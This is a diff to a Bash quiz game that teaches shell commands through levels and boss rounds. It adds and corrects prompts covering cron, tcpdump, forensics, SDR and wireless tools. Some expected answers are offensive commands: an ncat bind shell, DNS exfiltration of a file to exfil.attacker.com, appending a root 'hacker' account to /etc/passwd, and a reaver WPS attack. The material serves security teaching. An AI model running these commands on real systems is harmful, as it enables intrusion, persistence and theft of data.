@@ -1001,9 +1001,9 @@ declare -A EXP=(
   [hashcat]="GPU hash cracker" [john]="John the Ripper" [tshark]="terminal wireshark"
   [masscan]="fast port scanner" [airmon-ng]="WiFi monitor mode"
   [airodump-ng]="capture 802.11" [aireplay-ng]="inject packets" [aircrack-ng]="crack WPA/WEP"
-  [nc]="netcat" [smbclient]="SMB client" [lynis]="security audit" [binwalk]="firmware analysis"
+  [nc]="netcat" [ncat]="nmap netcat (supports -e)" [smbclient]="SMB client" [lynis]="security audit" [binwalk]="firmware analysis"
   [foremost]="file recovery" [fls]="list disk image" [exiftool]="file metadata" [readelf]="ELF info"
-  [r2]="radare2 RE framework" [volatility3]="memory forensics" [mactime]="filesystem timeline"
+  [r2]="radare2 RE framework" [vol]="memory forensics (volatility3)" [mactime]="filesystem timeline"
   [proxychains]="proxy traffic" [procs]="modern ps"
   [awk]="pattern scanning & processing" [jq]="JSON processor" [curl]="transfer data (HTTP/FTP)"
   [ssh]="secure shell" [scp]="secure copy" [rsync]="fast incremental transfer"
@@ -1081,6 +1081,9 @@ declare -A EXP=(
   [renice]="change process priority" [cgcreate]="create cgroup" [cgexec]="run in cgroup"
   [enum4linux]="SMB enumeration" [wash]="WPS scanner"
   [reaver]="WPS attack tool" [chkrootkit]="rootkit checker" [rkhunter]="rootkit hunter"
+  [bc]="calculator" [rev]="reverse lines" [docker]="container runtime" [crontab]="schedule tasks"
+  [tcpdump]="packet capture" [rtl_sdr]="RTL-SDR receiver" [rtl_433]="433MHz decoder" [rtl_fm]="FM demodulator"
+  [rtl_power]="frequency scanner" [iw]="wireless config"
   # Git
   [git]="version control" [clone]="copy repository" [commit]="save changes" [push]="upload to remote"
   [pull]="download from remote" [fetch]="download without merge" [merge]="combine branches"
@@ -1342,7 +1345,7 @@ gen_level3() {
   # wc variants
   questions+=("Count lines in ${W}${csv}${C}§wc -l ${csv}§#output:~[0-9]+")
   questions+=("Count words in ${W}${txt}${C}§wc -w ${txt}§#output:~[0-9]+")
-  questions+=("Count characters in ${W}${cfg}${C}§wc -c ${cfg}§wc -m ${cfg}§#output:~[0-9]+")
+  questions+=("Count characters in ${W}${cfg}${C}§wc -m ${cfg}§#output:~[0-9]+")
 
   # Combined pipes
   questions+=("First ${n} ${Y}${term1}${C} matches in ${W}${log}${C}§grep ${term1} ${log} | head -${n}§#output:*")
@@ -1770,7 +1773,8 @@ gen_level11() {
   questions+=("Add write permission for group|chmod g+w ${cfg}")
   questions+=("Remove all permissions for others|chmod o-rwx ${cfg}|chmod o= ${cfg}")
   questions+=("Make ${dir}/ and contents readable by all|chmod -R a+r ${dir}/")
-  questions+=("Set read-only for everyone|chmod a-w ${txt}|chmod 444 ${txt}")
+  questions+=("Remove write permission for everyone|chmod a-w ${txt}")
+  questions+=("Set exact read-only (r--r--r--)|chmod 444 ${txt}")
   questions+=("Copy permissions from ${cfg} to ${txt}|chmod --reference=${cfg} ${txt}")
 
   # === COMPOUND: Uses grep (L3), pipes (L3), logic (L6) ===
@@ -2054,6 +2058,25 @@ gen_level19() {
   questions+=("Vacuum journal to ${size}|journalctl --vacuum-size=${size}|sudo journalctl --vacuum-size=${size}")
   questions+=("Output as JSON|journalctl -u ${svc} -o json")
 
+  # Cron / crontab - scheduling
+  questions+=("Edit your crontab|crontab -e")
+  questions+=("List your cron jobs|crontab -l")
+  questions+=("Remove all your cron jobs|crontab -r")
+  questions+=("Edit root's crontab|sudo crontab -e")
+  questions+=("List another user's cron jobs|crontab -l -u ${user}")
+  questions+=("Run ${script} every 5 minutes|*/5 * * * * ${script}")
+  questions+=("Run ${script} at midnight daily|0 0 * * * ${script}")
+  questions+=("Run ${script} every Monday at 3am|0 3 * * 1 ${script}")
+  questions+=("Run ${script} on the 1st of each month|0 0 1 * * ${script}")
+  questions+=("Run ${script} every hour|0 * * * * ${script}|@hourly ${script}")
+  questions+=("Run ${script} at reboot|@reboot ${script}")
+  questions+=("Run ${script} daily (shorthand)|@daily ${script}")
+  questions+=("Run ${script} weekly (shorthand)|@weekly ${script}")
+  questions+=("Cron: redirect output to log§*/5 * * * * ${script} >> ${log} 2>&1")
+  questions+=("Cron: silence all output§0 * * * * ${script} > /dev/null 2>&1")
+  questions+=("List system-wide cron jobs|ls /etc/cron.d/")
+  questions+=("View cron log entries§journalctl -u cronie --since '1 hour ago'§grep -i cron /var/log/syslog")
+
   # === COMPOUND: Uses grep (L14), pipes (L3), logic (L6), find (L15) ===
   questions+=("Replace '${old}' in all .${ext} files, confirm changes§find . -name '*.${ext}' -exec grep -l ${old} {} \\; | xargs sed -i 's/${old}/${new}/g'")
   questions+=("Find .${ext} files > ${size}, delete with confirm§find . -name '*.${ext}' -size +${size} -print -delete")
@@ -2200,18 +2223,28 @@ gen_level26() {
   questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}")
 
   # Memory forensics (volatility3) - most common
-  questions+=("List processes from memory dump|volatility3 -f ${img} windows.pslist")
-  questions+=("List network connections from memory|volatility3 -f ${img} windows.netscan")
+  questions+=("List processes from memory dump|vol -f ${img} windows.pslist")
+  questions+=("List network connections from memory|vol -f ${img} windows.netscan")
 
   # File metadata
   questions+=("Extract all metadata from ${photo}|exiftool ${photo}")
-  questions+=("Extract GPS coordinates from photo|exiftool -gps* ${photo}")
+  questions+=("Extract GPS coordinates from photo|exiftool '-gps*' ${photo}")
   questions+=("Remove all metadata from ${photo}|exiftool -all= ${photo}")
 
   # Disk imaging
   questions+=("Create disk image of /dev/sda|dd if=/dev/sda of=${img} bs=4M status=progress")
   questions+=("Mount disk image read-only|mount -o ro,loop ${img} /mnt/evidence")
   questions+=("Verify checksums file|sha256sum -c ${hash}")
+
+  # File recovery / carving
+  questions+=("Recover deleted files from ${img}|foremost -i ${img}")
+  questions+=("Recover specific file types from image|foremost -t jpg,pdf -i ${img}")
+  questions+=("Foremost with custom output dir|foremost -i ${img} -o ${dir}/")
+  questions+=("List files in disk image (TSK)|fls ${img}")
+  questions+=("List files recursively in disk image|fls -r ${img}")
+  questions+=("List deleted files in disk image|fls -d ${img}")
+  questions+=("Create filesystem timeline|mactime -b ${dir}/bodyfile")
+  questions+=("Create bodyfile from disk image|fls -r -m / ${img} > ${dir}/bodyfile")
 
   printf '%s\n' "${questions[@]}"
 }
@@ -2273,8 +2306,8 @@ gen_level22() {
   # OpenSSL (cert checking, encryption)
   questions+=("Check SSL cert of website|openssl s_client -connect ${host}:443")
   questions+=("Generate random 32-byte hex string|openssl rand -hex 32")
-  questions+=("Encrypt file with AES-256|openssl enc -aes-256-cbc -salt -in file.txt -out file.enc")
-  questions+=("Decrypt AES-256 file|openssl enc -d -aes-256-cbc -in file.enc -out file.txt")
+  questions+=("Encrypt file with AES-256|openssl enc -aes-256-cbc -pbkdf2 -salt -in file.txt -out file.enc")
+  questions+=("Decrypt AES-256 file|openssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file.txt")
   questions+=("Generate RSA key pair|openssl genrsa -out key.pem 4096")
 
   # URL encoding (web testing)
@@ -2304,14 +2337,48 @@ gen_level24() {
   questions+=("Connect to remote port|nc ${ip} ${port}")
   questions+=("Send file via netcat|nc ${ip} ${port} < file.txt")
   questions+=("Port scan with netcat|nc -zv ${ip} 1-1000")
-  questions+=("Netcat bind shell|nc -lvnp ${port} -e /bin/bash")
+  questions+=("Bind shell with ncat|ncat -lvnp ${port} -e /bin/bash")
 
   # Mass scanning
   questions+=("Mass scan all ports on subnet at 10k rate|masscan -p1-65535 ${ip%.*}.0/24 --rate 10000")
   questions+=("Masscan specific ports|masscan -p 22,80,443 ${ip%.*}.0/24 --rate 1000")
 
+  # WPS attacks
+  questions+=("Scan for WPS-enabled APs|wash -i ${iface}mon")
+  questions+=("Attack WPS PIN on target AP|reaver -i ${iface}mon -b ${mac} -vv")
+  questions+=("Reaver with Pixie Dust attack|reaver -i ${iface}mon -b ${mac} -K")
+
+  # Packet capture
+  questions+=("Capture packets on ${iface}|tcpdump -i ${iface}")
+  questions+=("Capture and save to pcap file|tcpdump -i ${iface} -w ${pcap}")
+  questions+=("Read saved pcap file|tcpdump -r ${pcap}")
+  questions+=("Capture only port ${port} traffic|tcpdump -i ${iface} port ${port}")
+  questions+=("Capture only traffic to/from ${ip}|tcpdump -i ${iface} host ${ip}")
+  questions+=("Capture first ${n} packets|tcpdump -i ${iface} -c ${n}")
+  questions+=("Capture with verbose output|tcpdump -i ${iface} -vvv")
+  questions+=("Capture DNS traffic only|tcpdump -i ${iface} port 53")
+  questions+=("Capture HTTP traffic only|tcpdump -i ${iface} port 80")
+  questions+=("Don't resolve hostnames in capture|tcpdump -i ${iface} -n")
+
+  # SDR / RF basics
+  questions+=("List connected RTL-SDR devices|rtl_test")
+  questions+=("Record raw IQ data at 433MHz|rtl_sdr -f 433920000 -s 250000 capture.bin")
+  questions+=("Decode 433MHz sensor data|rtl_433")
+  questions+=("Decode with specific protocol|rtl_433 -R 1")
+  questions+=("Listen to FM radio at 100.3MHz|rtl_fm -f 100300000 -M wbfm -s 200000 - | aplay -r 48000 -f S16_LE")
+  questions+=("Scan frequency range for signals|rtl_power -f 400M:450M:100k -g 50 scan.csv")
+  questions+=("Set RTL-SDR gain to 40dB|rtl_sdr -f 433920000 -g 40 capture.bin")
+
   # Security audit
   questions+=("Run full system security audit|lynis audit system")
+  questions+=("Lynis scan specific category|lynis audit system --tests-from-group networking")
+
+  # Wireless recon
+  questions+=("Show wireless interfaces|iw dev")
+  questions+=("Scan for nearby APs|iw dev ${iface} scan|iwlist ${iface} scan")
+  questions+=("Show connected WiFi info|iw dev ${iface} link")
+  questions+=("Set WiFi channel to 6|iw dev ${iface}mon set channel 6")
+  questions+=("Disable monitor mode|airmon-ng stop ${iface}mon")
 
   printf '%s\n' "${questions[@]}"
 }
@@ -2451,14 +2518,14 @@ gen_level18() {
   questions+=("Exit on undefined variable|set -u")
   questions+=("Fail on pipe error|set -o pipefail")
   questions+=("Strict mode combo|set -euo pipefail")
-  questions+=("Check last command status|\$? -ne 0 && echo failed")
+  questions+=("Check last command status|[[ \$? -ne 0 ]] && echo failed")
   questions+=("Run command, ignore failure§cmd || true")
   questions+=("Die function|die() { echo \"\$1\" >&2; exit 1; }")
 
   # debugging
   questions+=("Enable debug mode (print commands)|set -x")
   questions+=("Disable debug mode|set +x")
-  questions+=("Dry run (print, don't execute)|set -n")
+  questions+=("Syntax check mode (read, don't execute)|set -n")
 
   printf '%s\n' "${questions[@]}"
 }
@@ -2499,7 +2566,7 @@ gen_level28() {
   questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
   questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
   questions+=("Exfil file via DNS (base64)§cat ${txt} | base64 | xargs -I{} dig {}.exfil.attacker.com")
-  questions+=("Bind shell with netcat|nc -lvnp ${port} -e /bin/bash")
+  questions+=("Bind shell with ncat|ncat -lvnp ${port} -e /bin/bash")
   questions+=("Encrypted netcat with openssl|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}")
   questions+=("Pivot through host (proxychains setup)|ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}")
 
@@ -2787,7 +2854,7 @@ gen_level27() {
   # Weak permissions
   questions+=("Check /etc/passwd writeable|ls -la /etc/passwd")
   questions+=("Check /etc/shadow readable|ls -la /etc/shadow")
-  questions+=("Add user to /etc/passwd|echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd")
+  questions+=("Add user to /etc/passwd|echo 'hacker:\$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd")
   questions+=("Check writable /etc/sudoers|ls -la /etc/sudoers")
 
   # Path hijacking
@@ -3188,7 +3255,7 @@ run() {
   local t1=() t2=()
   for q in "${CURRENT_QUESTIONS[@]}"; do
     _qparse "$q"
-    case "$(_sget "$_qprompt")" in 1) t1+=("$q");; *) t2+=("$q");; esac
+    case "$(_sget "$_qprompt")" in 0|1) t1+=("$q");; *) t2+=("$q");; esac
   done
   # Shuffle and interleave: tier 1 first, mix in tier 2
   local _shuf1=() _shuf2=()
@@ -3400,11 +3467,11 @@ run() {
     printf '%s\n' "${G}${B}══ ${boss} DEFEATED ══${N}"
     printf '%s\n' "${G}${boss_correct}/${boss_total}${N} correct!"
     printf '%s\n\n' "${C}You acquired: ${LEVEL_NAMES[$lv]}${N}"
+    ((BOSS_BEATEN < lv)) && { BOSS_BEATEN=$lv; _save_profile; }
     if ((lv<MAX_LEVEL)); then
       local next_pass; next_pass=$(_level_pass "$((lv+1))")
       printf '%s\n' "${Y}PASSWORD: ${B}${next_pass}${N}"
       printf 'Enter for Level %d...\n' "$((lv+1))"; read -r
-      ((BOSS_BEATEN < lv)) && { BOSS_BEATEN=$lv; _save_profile; }
       LVL=$((lv+1)); QI=0; save; run "$LVL"
     else
       printf '%s\n' "${G}${B}ALL COMPLETE - ROOT ACCESS GRANTED${N}"
@@ -3415,7 +3482,7 @@ run() {
     printf '%s\n' "${D}r = retry, p = practice${N}"
     read -rsn1 choice
     case "$choice" in
-      r) QI=0; run "$lv" ;;
+      r) QI=0; save; run "$lv" ;;
       *) QI=0; save; run "$lv" ;;
     esac
   fi
@@ -3432,7 +3499,13 @@ case "${1:-}" in
     if ((LVL > 0 && LVL > BOSS_BEATEN + 1)); then
       printf '%s\n' "${Y}Level $LVL locked${N} - enter password (or beat Level $((LVL-1)) boss):"
       read -rp "> " _pass
-      if [[ "${_pass^^}" != "$(_level_pass "$LVL")" ]]; then
+      _unlocked=0
+      for _lv in $(seq "$LVL" "$MAX_LEVEL"); do
+        if [[ "${_pass^^}" == "$(_level_pass "$_lv")" ]]; then
+          _unlocked=1; break
+        fi
+      done
+      if ((!_unlocked)); then
         printf '%s\n' "${R}Wrong password${N}"
         exit 1
       fi
@@ -3443,14 +3516,22 @@ case "${1:-}" in
   p|pass)
     _load_profile
     if [[ -z "${2:-}" ]]; then
-      # Show earned passwords
+      # Show all levels with unlock status
       if ((BOSS_BEATEN < 0)); then
         echo "No passwords yet - beat Level 0 boss first"
       else
-        for lv in $(seq 1 $((BOSS_BEATEN + 1))); do
+        printf '%s\n' "${B}Unlocked Levels${N}"
+        for lv in $(seq 0 $((BOSS_BEATEN + 1))); do
           ((lv > MAX_LEVEL)) && break
-          printf "Level %2d: %s\n" "$lv" "$(_level_pass "$lv")"
+          if ((lv == 0)); then
+            printf "  ${G}%2d${N} %-22s ${D}(always open)${N}\n" "$lv" "${LEVEL_NAMES[$lv]:-}"
+          else
+            printf "  ${G}%2d${N} %-22s ${Y}%s${N}\n" "$lv" "${LEVEL_NAMES[$lv]:-}" "$(_level_pass "$lv")"
+          fi
         done
+        if ((BOSS_BEATEN + 2 <= MAX_LEVEL)); then
+          printf '\n%s\n' "${D}Locked: Levels $((BOSS_BEATEN + 2))-${MAX_LEVEL}${N}"
+        fi
       fi
     else
       # Try password against all levels
